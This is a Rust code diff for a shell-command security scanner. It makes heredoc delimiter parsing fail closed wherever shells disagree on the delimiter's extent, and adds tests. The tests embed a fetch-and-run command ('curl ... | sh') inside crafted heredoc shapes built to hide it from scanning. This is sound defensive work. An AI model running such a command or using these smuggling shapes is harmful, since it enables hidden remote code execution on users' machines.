@@ -3880,6 +3880,9 @@ struct PosixHeredocSpec {
     delimiter: String,
     quoted: bool,
     strip_tabs: bool,
+    /// The header line ends in a CR right after the word (a CRLF line), so
+    /// the shells' delimiter is `delimiter` plus that CR.
+    word_ends_in_cr: bool,
     operator_range: std::ops::Range<usize>,
     stdin: bool,
 }
@@ -3949,6 +3952,13 @@ fn parse_posix_heredoc_delimiter(line: &str, operator: usize) -> Result<(String,
         {
             return Err(());
         }
+        // A `!` outside single quotes starts a history expansion in an
+        // interactive bash or zsh (on by default): `!#` is the line typed so
+        // far, so `cat <<E!#` reads `cat <<Ecat <<E` there (two heredocs).
+        // Batch shells keep the `!`. The terminator depends on the shell.
+        if quote != Some(b'\'') && byte == b'!' {
+            return Err(());
+        }
         if let Some(active) = quote {
             if byte == active {
                 quote = None;
@@ -4001,7 +4011,18 @@ fn parse_posix_heredoc_delimiter(line: &str, operator: usize) -> Result<(String,
             delimiter.push(next);
             quoted = true;
             index += 2;
-        } else if byte.is_ascii_whitespace() || b";&|<>()".contains(&byte) {
+        } else if byte == b'(' || (byte == b'<' && starts_zsh_numeric_glob(&bytes[index..])) {
+            // zsh keeps a glob group (`E(x)F`, `'E'(x)F`) or a numeric glob
+            // (`E<->F`) in the word, and so do bash with extglob and ksh for
+            // `E@(x)F`; bash and dash end the word before it (or reject the
+            // `(`). The terminator depends on the shell.
+            return Err(());
+        } else if byte == 0x0c || (byte == b'\r' && index + 1 < bytes.len()) {
+            // No shell ends a word at a form feed or at a carriage return
+            // inside the line. A CR that ends a CRLF line ends the word here
+            // and is matched by the terminator check.
+            return Err(());
+        } else if byte.is_ascii_whitespace() || b";&|<>)".contains(&byte) {
             break;
         } else {
             delimiter.push(byte);
@@ -4011,11 +4032,25 @@ fn parse_posix_heredoc_delimiter(line: &str, operator: usize) -> Result<(String,
             return Err(());
         }
     }
-    if quote.is_some() {
+    // A quoted or escaped CR is part of the word; terminator lines are
+    // compared with their trailing CR set aside, so they could not match it.
+    if quote.is_some() || delimiter.contains(&b'\r') {
         return Err(());
     }
     let delimiter = String::from_utf8(delimiter).map_err(|_| ())?;
     Ok((delimiter, quoted, index))
+}
+
+/// `<`, optional digits, `-`, optional digits, `>` at the start of `bytes`: a
+/// zsh numeric glob (`<->`, `<1-20>`), which zsh keeps inside a word.
+fn starts_zsh_numeric_glob(bytes: &[u8]) -> bool {
+    let after_digits = |from: usize| {
+        from + bytes.get(from..).map_or(0, |rest| {
+            rest.iter().take_while(|byte| byte.is_ascii_digit()).count()
+        })
+    };
+    let dash = after_digits(1);
+    bytes.get(dash) == Some(&b'-') && bytes.get(after_digits(dash + 1)) == Some(&b'>')
 }
 
 fn posix_heredoc_specs(
@@ -4107,6 +4142,7 @@ fn posix_heredoc_specs(
                     delimiter,
                     quoted,
                     strip_tabs,
+                    word_ends_in_cr: bytes.get(end) == Some(&b'\r') && end + 1 == bytes.len(),
                     operator_range: digit_start..end,
                     stdin: fd.is_none_or(|raw| raw == "0"),
                 });
@@ -4338,6 +4374,7 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
                 delimiter: spec.delimiter.clone(),
                 quoted: spec.quoted,
                 strip_tabs: spec.strip_tabs,
+                word_ends_in_cr: spec.word_ends_in_cr,
                 operator_range: (spec.operator_range.start - cursor)
                     ..(spec.operator_range.end - cursor),
                 stdin: spec.stdin,
@@ -4347,28 +4384,44 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
         for (spec, relative) in specs.iter().zip(relative_specs.iter()) {
             let body_start = body_cursor;
             let mut terminator = None;
+            let mut cr_dependent = false;
             while body_cursor <= raw.len() {
                 let line_end = raw[body_cursor..]
                     .find('\n')
                     .map_or(raw.len(), |offset| body_cursor + offset);
-                let line = raw
-                    .get(body_cursor..line_end)
-                    .unwrap_or_default()
-                    .strip_suffix('\r')
-                    .unwrap_or_else(|| raw.get(body_cursor..line_end).unwrap_or_default());
+                let raw_line = raw.get(body_cursor..line_end).unwrap_or_default();
+                let line = raw_line.strip_suffix('\r').unwrap_or(raw_line);
                 let candidate = if spec.strip_tabs {
                     line.trim_start_matches('\t')
                 } else {
                     line
                 };
                 if candidate == spec.delimiter {
-                    terminator = Some((body_cursor, line_end));
+                    // bash, dash, zsh and ksh compare the line byte for byte,
+                    // so its CR must match the word's; a shell that drops
+                    // CRs (Cygwin bash's igncr) would end the heredoc here
+                    // anyway. Where the two disagree the boundary depends on
+                    // the shell, and ending it early would let a data line
+                    // such as `cat <<Z` open a heredoc that hides code.
+                    if raw_line.ends_with('\r') == spec.word_ends_in_cr {
+                        terminator = Some((body_cursor, line_end));
+                    } else {
+                        cr_dependent = true;
+                    }
                     break;
                 }
                 if line_end == raw.len() {
                     break;
                 }
                 body_cursor = line_end + 1;
+            }
+            if cr_dependent {
+                // Fail closed with every line left visible.
+                recovery
+                    .gap
+                    .get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                body_cursor = raw.len();
+                break;
             }
             let Some((terminator_start, terminator_end)) = terminator else {
                 recovery
@@ -15820,6 +15873,83 @@ mod tests {
         let literal = format!("cat <<'E\\!F'\nbody\nE\\!F\n{payload}\n");
         let spans = posix_heredoc_spans(&literal).expect("single-quoted \\! delimiter");
         assert_eq!(&literal[spans[0].body.clone()], "body\n");
+    }
+
+    /// Where the delimiter word or its terminator line is not the same in
+    /// every shell, the heredoc fails closed and every line stays visible:
+    /// - a `!` outside single quotes is history-expanded by an interactive
+    ///   bash and zsh (`!#` is the line typed so far, so `cat <<E!#` becomes
+    ///   `cat <<Ecat <<E`, two heredocs);
+    /// - a `(` after word bytes is a glob group to zsh, and to bash with
+    ///   extglob and ksh (`E(x)F`, `E@(x)F`), one word ending at `E(x)F`;
+    /// - `<->` / `<1-2>` is a zsh numeric glob inside the word;
+    /// - no shell ends a word at a form feed or at a carriage return inside
+    ///   the line;
+    /// - a terminator line that matches only once its carriage return is
+    ///   dropped (or added) is no terminator to bash, dash, zsh or ksh.
+    #[test]
+    fn heredoc_delimiter_extent_that_differs_between_shells_fails_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://example.com/i.sh | sh";
+        // Every shape is checked before failing, so a regression names them all.
+        let mut wrong = Vec::new();
+        for input in [
+            format!("cat <<E!#\nEcat\nbody\nE\n{payload}\nE!#\n"),
+            format!("cat <<\"E\"!#\nEcat\nbody\nE\n{payload}\nE!#\n"),
+            format!("cat <<\"E!#\"\nEcat\nbody\nE\n{payload}\nE!#\n"),
+            format!("cat <<\"E!#:0\"\nEcat\n{payload}\nE!#:0\n"),
+            format!("cat <<E!#:0\nEcat\n{payload}\nE!#:0\n"),
+            format!("cat <<E(x)F\nE(x)F\n{payload}\nE\n"),
+            format!("cat <<E(a|b)F\nE(a|b)F\n{payload}\nE\n"),
+            format!("cat <<'E'(x)F\nE(x)F\n{payload}\nE\n"),
+            format!("cat <<E@(x)F\nE@(x)F\n{payload}\nE@\n"),
+            format!("cat <<E+(x)F\nE+(x)F\n{payload}\nE+\n"),
+            format!("cat <<E<->F\nE<->F\n{payload}\nE\n"),
+            format!("cat <<E<1-2>F\nE<1-2>F\n{payload}\nE\n"),
+            format!("cat <<E\x0cF\nE\x0cF\n{payload}\nE\n"),
+            format!("cat <<E\x0c\nE\x0c\n{payload}\nE\n"),
+            format!("cat <<E\rF\nE\rF\n{payload}\nE\n"),
+            // The shells end the first heredoc at `EOF` only, so `cat <<Z`
+            // is data there and the pipeline runs.
+            format!("cat <<EOF\nEOF\r\ncat <<Z\nEOF\n{payload}\nZ\n"),
+            format!("cat <<EOF\r\nEOF\ncat <<Z\r\nEOF\r\n{payload}\nZ\r\n"),
+            // The word ends at the blank, so `EOF\r` is no terminator.
+            format!("cat <<EOF >out.txt\r\nbody\r\nEOF\r\n{payload}\n"),
+            // A quoted or escaped CR is part of the word.
+            format!("cat <<'EOF\r'\nEOF\r\n{payload}\n"),
+            format!("cat <<EOF\\\r\nEOF\r\n{payload}\n"),
+        ] {
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            let view = shell_execution_view(&input, ShellType::Posix);
+            if posix_heredoc_spans(&input).is_some()
+                || scan.gap.is_none()
+                || !view.contains(payload)
+            {
+                wrong.push(input);
+            }
+        }
+        assert!(wrong.is_empty(), "boundary read one way only: {wrong:#?}");
+
+        // Spellings every shell reads alike keep their exact boundaries.
+        for (input, body) in [
+            // Single quotes stop history expansion and globbing.
+            ("cat <<'E!F'\nbody\nE!F\n", "body\n"),
+            ("cat <<'E(x)F'\nbody\nE(x)F\n", "body\n"),
+            ("cat <<'E<->F'\nbody\nE<->F\n", "body\n"),
+            // `)` still ends the word, and a `<` that starts no numeric glob
+            // is a redirection.
+            ("(cat <<EOF)\nbody\nEOF\n", "body\n"),
+            ("cat <<EOF<input.txt\nbody\nEOF\n", "body\n"),
+            ("cat <<EOF;echo done\nbody\nEOF\n", "body\n"),
+            // CRLF lines: the word and the terminator both end in `\r`.
+            ("cat <<EOF\r\nbody\r\nEOF\r\n", "body\r\n"),
+            ("cat <<'EOF'\r\nbody\r\nEOF\r\n", "body\r\n"),
+            ("cat <<-EOF\r\n\tbody\r\n\tEOF\r\n", "\tbody\r\n"),
+        ] {
+            let spans = posix_heredoc_spans(input).unwrap_or_else(|| panic!("{input:?}"));
+            assert_eq!(spans.len(), 1, "{input:?}");
+            assert_eq!(&input[spans[0].body.clone()], body, "{input:?}");
+        }
     }
 
     #[test]
